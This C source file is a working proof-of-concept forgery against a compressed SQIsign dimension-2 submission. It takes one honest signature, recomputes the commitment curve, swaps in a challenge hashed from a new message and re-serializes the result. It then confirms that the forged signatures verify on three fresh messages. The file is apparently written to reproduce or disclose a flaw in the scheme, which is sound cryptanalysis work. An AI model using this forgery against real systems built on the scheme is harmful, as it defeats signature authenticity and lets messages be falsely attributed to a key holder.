#define _POSIX_C_SOURCE 200809L

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "config.h"
#include "drng.h"
#include "sqisign/SIG_AlgorithmInstance.h"
#include "sqisign/sqisigndim2.h"

#if COMPRESSED != 1
#error "This reproducer must be compiled with COMPRESSED=1"
#endif

#ifndef ATTACK_LABEL
#define ATTACK_LABEL ALGORITHM_INSTANCE
#endif

extern DRNG_ctx drng_algorithm;

/* sign.c exports this routine but its public header omits the declaration. */
void hash_to_challenge(digit_t *out,
                       const ec_curve_t *com_curve,
                       const unsigned char *message,
                       const public_key_t *pk,
                       size_t length);

static double seconds_since(const struct timespec *start,
                            const struct timespec *end)
{
    return (double)(end->tv_sec - start->tv_sec)
         + 1e-9 * (double)(end->tv_nsec - start->tv_nsec);
}

/*
 * Reconstruct E_com exactly as the submitted compact verifier does, hash the
 * target message, replace sig->chall, and serialize the result.  All invoked
 * primitives come from the unmodified submission.
 */
static int retarget_signature(unsigned char *forged,
                              const unsigned char *source,
                              const unsigned char *state_pk,
                              const unsigned char *target,
                              size_t target_len)
{
    public_key_t pk;
    signature_t sig;
    ec_basis_t B_pk_can, B_diag_can, B_chall_can;
    ec_curve_t E_com, E_chall, E_pk_hint;
    ec_isom_t isom;
    ec_isog_three_t phi;
    theta_couple_curve_t Epk_x_diag;
    theta_couple_point_t T1, T2, T1m2;
    theta_chain_t isog;
    ec_point_t ker_chall_dual;

    public_key_init(&pk);
    secret_sig_init(&sig);
    public_key_from_bytes(&pk, state_pk);
    signature_from_bytes(&sig, source);

    Epk_x_diag.E1 = pk.curve;
    Epk_x_diag.E2 = sig.E_diag;
    E_pk_hint = pk.curve;

    ec_curve_to_basis_2f_from_hint(&B_diag_can, &sig.E_diag,
                                   TORSION_PLUS_EVEN_POWER, sig.hint_diag);
    ec_curve_to_basis_2f_from_hint(&B_pk_can, &E_pk_hint,
                                   TORSION_PLUS_EVEN_POWER, pk.hint_pk);
    matrix_application_even_basis(&B_pk_can, &pk.curve,
                                  &sig.mat_Bpk_can_to_B_pk,
                                  TORSION_PLUS_EVEN_POWER);

    copy_point(&T1.P1, &B_pk_can.P);
    copy_point(&T2.P1, &B_pk_can.Q);
    copy_point(&T1m2.P1, &B_pk_can.PmQ);
    copy_point(&T1.P2, &B_diag_can.P);
    copy_point(&T2.P2, &B_diag_can.Q);
    copy_point(&T1m2.P2, &B_diag_can.PmQ);

    theta_chain_comput_strategy(&isog,
                                TORSION_PLUS_EVEN_POWER,
                                &Epk_x_diag,
                                &T1,
                                &T2,
                                &T1m2,
                                strategies[0],
                                0);

    {
        fp2_t j1, j2;
        ec_j_inv(&j1, &isog.codomain.E1);
        ec_j_inv(&j2, &isog.codomain.E2);
        if (fp2_cmp(&j1, &j2) >= 0) {
            E_chall = sig.hint_curve ? isog.codomain.E1 : isog.codomain.E2;
        } else {
            E_chall = sig.hint_curve ? isog.codomain.E2 : isog.codomain.E1;
        }
    }

    ec_curve_standardized(&isom, &E_chall, &E_chall);
    ec_curve_to_basis_3f_from_hint(&B_chall_can, &E_chall,
                                   sig.hint_chall,
                                   TORSION_PLUS_THREE_POWER);

    {
        digit_t one[NWORDS_ORDER_3] = {1};
        if (sig.ind) {
            ec_biscalar_mul_3(&ker_chall_dual, &E_chall,
                              one, sig.scalar, &B_chall_can);
        } else {
            ec_biscalar_mul_3(&ker_chall_dual, &E_chall,
                              sig.scalar, one, &B_chall_can);
        }
    }

    phi.curve = E_chall;
    phi.length = TORSION_PLUS_THREE_POWER;
    phi.kernel = ker_chall_dual;
    ec_eval_three(&E_com, &phi, NULL, 0, NULL);

    hash_to_challenge(sig.chall, &E_com, target, &pk, target_len);
    signature_to_bytes(forged, &sig);

    secret_sig_finalize(&sig);
    public_key_finalize(&pk);
    return 0;
}

static int outside_challenge_unchanged(const unsigned char *a,
                                       const unsigned char *b)
{
    const size_t off = FP2_ENCODED_BYTES;
    const size_t end = off + NWORDS_ORDER_3_BYTES;
    for (size_t i = 0; i < SIGNATURE_BYTES; i++) {
        if ((i < off || i >= end) && a[i] != b[i]) return 0;
    }
    return 1;
}

int main(void)
{
    static const unsigned char source_message[] =
        "CompactSQIsign2D2 oracle message";
    static const char *targets[3] = {
        "CompactSQIsign2D2 fresh target alpha",
        "CompactSQIsign2D2 fresh target beta",
        "CompactSQIsign2D2 fresh target gamma"
    };
    unsigned char seed[48];
    unsigned char pk[PUBLICKEY_BYTES], sk[SECRETKEY_BYTES];
    unsigned char source[SIGNATURE_BYTES], forged[SIGNATURE_BYTES];
    unsigned long long pk_len = 0, sk_len = 0, sig_len = 0;
    struct timespec t0, t1;
    double keygen_s, sign_s, forge_ms[3];
    int rc = 0;

    for (size_t i = 0; i < sizeof(seed); i++)
        seed[i] = (unsigned char)(0x41u + (13u * i + sizeof(ATTACK_LABEL)) % 191u);
    if (init_random_number(&drng_algorithm, seed, sizeof(seed)) != 0) {
        fprintf(stderr, "DRNG initialization failed\n");
        return 2;
    }

    clock_gettime(CLOCK_MONOTONIC, &t0);
    if (sig_keygen(pk, &pk_len, sk, &sk_len) != 0) return 3;
    clock_gettime(CLOCK_MONOTONIC, &t1);
    keygen_s = seconds_since(&t0, &t1);

    clock_gettime(CLOCK_MONOTONIC, &t0);
    if (sig_sign(sk, sk_len,
                 (unsigned char *)source_message, sizeof(source_message) - 1,
                 source, &sig_len) != 0) return 4;
    clock_gettime(CLOCK_MONOTONIC, &t1);
    sign_s = seconds_since(&t0, &t1);

    if (pk_len != PUBLICKEY_BYTES || sk_len != SECRETKEY_BYTES ||
        sig_len != SIGNATURE_BYTES) return 5;
    if (sig_verify(pk, pk_len, source, sig_len,
                   (unsigned char *)source_message,
                   sizeof(source_message) - 1) != 0) {
        fprintf(stderr, "honest source signature rejected\n");
        return 6;
    }

    for (size_t i = 0; i < 3; i++) {
        const size_t target_len = strlen(targets[i]);
        if (sig_verify(pk, pk_len, source, sig_len,
                       (unsigned char *)targets[i], target_len) == 0) {
            fprintf(stderr, "untouched signature accepted on target %zu\n", i);
            rc = 7;
            break;
        }

        clock_gettime(CLOCK_MONOTONIC, &t0);
        retarget_signature(forged, source, pk,
                           (const unsigned char *)targets[i], target_len);
        clock_gettime(CLOCK_MONOTONIC, &t1);
        forge_ms[i] = 1000.0 * seconds_since(&t0, &t1);

        if (!outside_challenge_unchanged(source, forged)) {
            fprintf(stderr, "bytes outside challenge field changed on target %zu\n", i);
            rc = 8;
            break;
        }
        if (memcmp(source + FP2_ENCODED_BYTES,
                   forged + FP2_ENCODED_BYTES,
                   NWORDS_ORDER_3_BYTES) == 0) {
            fprintf(stderr, "challenge field did not change on target %zu\n", i);
            rc = 9;
            break;
        }
        if (sig_verify(pk, pk_len, forged, sig_len,
                       (unsigned char *)targets[i], target_len) != 0) {
            fprintf(stderr, "forgery rejected on target %zu\n", i);
            rc = 10;
            break;
        }
        if (sig_verify(pk, pk_len, forged, sig_len,
                       (unsigned char *)source_message,
                       sizeof(source_message) - 1) == 0) {
            fprintf(stderr, "retargeted signature still accepted on source %zu\n", i);
            rc = 11;
            break;
        }
    }

    if (rc != 0) return rc;
    printf("RESULT label=%s status=PASS pk=%u sk=%u sig=%u offset=%u field=%u "
           "keygen_s=%.6f sign_s=%.6f forge_ms=%.3f,%.3f,%.3f\n",
           ATTACK_LABEL,
           (unsigned)PUBLICKEY_BYTES,
           (unsigned)SECRETKEY_BYTES,
           (unsigned)SIGNATURE_BYTES,
           (unsigned)FP2_ENCODED_BYTES,
           (unsigned)NWORDS_ORDER_3_BYTES,
           keygen_s, sign_s,
           forge_ms[0], forge_ms[1], forge_ms[2]);
    return 0;
}
